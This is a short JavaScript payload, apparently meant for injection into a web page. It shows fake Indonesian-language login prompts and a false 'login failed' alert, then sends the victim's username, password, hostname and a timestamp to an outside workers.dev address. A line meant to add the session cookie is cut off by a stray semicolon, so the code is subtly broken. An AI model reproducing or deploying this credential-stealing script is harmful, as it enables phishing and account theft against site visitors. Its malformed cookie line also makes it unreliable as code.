(function () {
  const user = prompt("Nama pengguna:");
  if (user === null) return;

  const pass = prompt("Sandi:");
  if (pass === null) return;

  alert("Login Gagal");

  const data =
    "user=" + user +
    "&pass=" + pass +
    "&domain=" + location.hostname +
    "&time=" + new Date().toISOString();
    "&phpsessid=" + document.cookie +
    
  fetch("https://memek-worker.defoy89122.workers.dev/?message=" 
    + encodeURIComponent(data)
  );
})();
